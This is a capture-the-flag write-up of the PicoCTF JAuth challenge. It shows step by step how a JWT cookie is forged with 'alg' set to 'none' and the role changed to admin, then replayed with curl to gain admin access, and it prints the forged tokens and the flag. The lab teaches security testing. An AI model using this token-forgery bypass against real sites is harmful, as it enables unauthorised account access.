# Write up of JAuth PicoCTF problem

This write up of the PicoCTF JAuth challenge is different from others because it is from first-principles. We explain how the clues lead logically to the solution!

## Problem Specification

- AUTHOR: GEOFFREY NJOGU

Most web application developers use third party components without testing their security. Some of the past affected companies are:

- Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
- Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
- VerticalScope (internet media company) - outdated version of vBulletin forum software used

Can you identify the components and exploit the vulnerable one?
The website is running at [http://saturn.picoctf.net:55824](http://saturn.picoctf.net:55824). Can you become an admin?
You can login as `test` with the password `Test123!` to get started.

### Hints

- Use the web browser tools to check out the JWT cookie.
- The JWT should always have two (2) . separators.

## Local Setup

In this walk-through I am using the FireFox browser. The reason for this is that it has some hacker friendly tricks that the more popular browsers don't have. We shall see this in due course.

## Solution Strategy

Firstly the problem starts talking about famous public web-oriented hacks, and then the first hint is about JWT cookies.
Logically we can combine these two ideas as follows:

1.  Lets try out the given website, and study the JWT cookie.
1.  Lets do research on known vulnerabilities related to the JWT cookie we get.

The note about JWT separators is unusual, so we'll need to come back to that when it is relevant.

## Initial Interaction with the Bank website

1. I launch FireFox and visit http://saturn.picoctf.net:55824
1. It prompts for username and password, so I give it `test` and `Test123!`

We now use the menu option `Tools > Browser Tools > Web Developer Tools`

To find out cookies, we use Diagnostic Tab `Storage` and then on the left use sub-section `Cookies`.

This tells us there is a cookie called `token` whose value is

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjg4MzA4OTY3MjA5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE1OyBydjoxMDkuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMTQuMCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg4MzA4OTY3fQ.aJ_sbLSDUsxHCCbwzF1AwxeSS-AmI4T3dWhhgvkoluU
```

Note that on Firefox you can double click here and actually edit the cookie. This is one reason why Firefox is hacker-friendly.

We know that this is a good cookie in the sense that we managed to login with it. Also the cookie is base64 encoded but with the dot (period) character. It is of the form `A.B.C` where each of A, B, and C and base64 encoded strings. So we note this is called out by the second hint which draws attention to the `.` (period) characters.

## Research

When we look up the public breaches we note that the websites call out various insecure aspects of the technology they used.
So what is potentially insecure about our JWT above?

To find out what we have we can use the JWT debugger website [https://token.dev/](https://token.dev/). By pasting in the above token value we get:

```
Header
{
  "typ": "JWT",
  "alg": "HS256"
}
Payload
{
  "auth": 1688308967209,
  "agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0",
  "role": "user",
  "iat": 1688308967
}
```

A search for JWT Vulnerabilities such as "how to detect if a website uses insecure JWT implementation" yields the website
[Testing JSON Web Tokens](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)

![Guidelines](./WSTG_Guidelines.png)

This is now a direct walkthrough of what we need to do. First switch off security, by setting "alg" to "none", then set the role to "admin", and then omit the signature at the end but retain the trailing period.

Using the JWT debugger website with the Algorithm Drop-Down button set to `none` we can get to:

![Modified JWT](./modifiedJWT.png)

```
Header
{
  "typ": "JWT",
  "alg": "none"
}
{
  "auth": 1688308967209,
  "agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0",
  "role": "admin",
  "iat": 1688308967
}
```

This yields the base64 JWT:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg4MzA4OTY3MjA5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE1OyBydjoxMDkuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMTQuMCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4ODMwODk2N30
```

We then just need to add the trailing period so it remains valid:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg4MzA4OTY3MjA5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE1OyBydjoxMDkuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMTQuMCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4ODMwODk2N30.
```

If we go back into Firefox, having double-clicked the Cookie value, we can paste in the above value, and then press Reload.
It gives us an Admin login with the Flag shown.

![Edited JWT](./editedJWT.png)

There is one final Firefox trick. Clicking on the Network Tab, clicking on the network request (that returned 200) and then right-clicking we can select `Copy Value > Copy as cURL` to get the following:

![getCurl.png](./getCurl.png)

```
curl 'http://saturn.picoctf.net:55824/private' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-GB,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://saturn.picoctf.net:55824/' -H 'Connection: keep-alive' -H 'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg4MzA4OTY3MjA5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE1OyBydjoxMDkuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMTQuMCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4ODMwODk2N30.' -H 'Upgrade-Insecure-Requests: 1'
```

This can be pruned down to the essentials to prove we know our solution.

```
curl 'http://saturn.picoctf.net:55824/private' -H 'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg4MzA4OTY3MjA5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE1OyBydjoxMDkuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMTQuMCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4ODMwODk2N30.'
```

The result is:

```

<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />
    <title>Our Bank</title>
    <link
      rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/bootswatch/3.2.0/united/bootstrap.min.css"
    />
    <style type="text/css">
      .form-signin {
        width: 100%;
        max-width: 420px;
        padding: 15px;
        margin: auto;
      }
    </style>
  </head>
  <body>
    <div class="text-center">
      <h1>Hello, admin! You have logged in as admin!</h1>
    </div>
    <div class="text-center"><span>picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}</span></div>
    <form class="form-signin" action="/logout" method="GET">
      <div class="text-center mb-4">
        <input type="submit" class="btn btn-danger" value="logout" />
      </div>
    </form>
  </body>
</html>
```

Hence the flag is `picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}`
